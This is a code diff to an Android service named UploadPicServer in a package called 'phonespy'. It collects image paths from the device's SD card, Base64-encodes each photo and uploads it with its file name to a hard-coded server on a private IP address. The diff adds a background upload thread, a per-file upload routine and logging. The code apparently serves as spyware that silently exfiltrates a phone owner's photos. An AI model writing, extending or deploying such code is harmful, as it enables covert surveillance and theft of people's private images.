@@ -7,6 +7,8 @@ import android.graphics.BitmapFactory;
 import android.os.Environment;
 import android.os.IBinder;
 import android.support.annotation.Nullable;
+import android.util.Log;
+import android.widget.Toast;
 
 import org.apache.http.HttpEntity;
 import org.apache.http.HttpResponse;
@@ -22,15 +24,15 @@ import java.io.File;
 import java.util.ArrayList;
 import java.util.List;
 
+import info.peoce.phonespy.App;
 import info.peoce.phonespy.Util.Base64Util;
-import info.peoce.phonespy.Util.GzipUtil;
 import info.peoce.phonespy.Util.Others;
 
 public class UploadPicServer extends Service {
     private String path = "";
     private List<String> fileList;
-    private Bitmap bitmap;
-    private static final String HOST = "http://192.168.0.100:8080/ImageServer/upServer";
+    private static final String HOST = "http://192.168.1.100:8080/ImageServer/upServer";
+    Thread upload_thread;
 
     public UploadPicServer() {
     }
@@ -39,19 +41,30 @@ public class UploadPicServer extends Service {
     public void onCreate() {
         super.onCreate();
         fileList = getImagePathFromSD();
+        upload_thread=new Thread(new Runnable() {
+            @Override
+            public void run() {
+                int totalPic = fileList.size();
+                Log.i("TAG", "图片有" + totalPic + "张");
+                for (int i = 0; i < totalPic; i++) {
+                    String path = fileList.get(i);
+                    Log.i("TAG", "路径为 " + path);
+                    Bitmap bitmap = BitmapFactory.decodeFile(path);
+                    String fileName = path.substring(path.lastIndexOf("/") + 1);
+                    upload(bitmap, fileName);
+                }
+            }
+        });
     }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        new Thread(new Runnable() {
-            public void run() {
-                for (int i = 0; i < fileList.size(); i++) {
-                    System.out.println(fileList.get(i));
-                    bitmap = BitmapFactory.decodeFile(fileList.get(i));
-                    upload();
-                }
-            }
-        }).start();
+      if(!upload_thread.isAlive()) {
+          upload_thread.start();
+      }else {
+          upload_thread.interrupt();
+          Toast.makeText(App.getContext(),"正在上传",Toast.LENGTH_SHORT).show();
+      }
         return super.onStartCommand(intent, flags, startId);
     }
 
@@ -79,17 +92,19 @@ public class UploadPicServer extends Service {
         return picList;
     }
 
-    private void upload() {
+    private void upload(Bitmap bitmap, String fileName) {
         ByteArrayOutputStream stream = new ByteArrayOutputStream();
         bitmap.compress(Bitmap.CompressFormat.JPEG, 100, stream);
         byte[] b = stream.toByteArray();
         // 将图片流以字符串形式存储下来
         String file = Base64Util.encodeLines(b);
-        String gzipFile = GzipUtil.compress(file);
+//        file = GzipUtil.compress(file);
         HttpClient client = new DefaultHttpClient();
         // 设置上传参数
         List<NameValuePair> formparams = new ArrayList<NameValuePair>();
-        formparams.add(new BasicNameValuePair("file", gzipFile));
+        formparams.add(new BasicNameValuePair("file", file));
+        formparams.add(new BasicNameValuePair("fileName", fileName));
+        Log.i("TAG", "开始上传" + fileName);
         HttpPost post = new HttpPost(HOST);
         UrlEncodedFormEntity entity;
         try {
@@ -114,5 +129,16 @@ public class UploadPicServer extends Service {
         } catch (Exception e) {
             e.printStackTrace();
         }
+    }
+
+    @Override
+    public void onDestroy() {
+        upload_thread.interrupt();
+        super.onDestroy();
+    }
+
+    @Override
+    public boolean onUnbind(Intent intent) {
+        return super.onUnbind(intent);
     }
 }
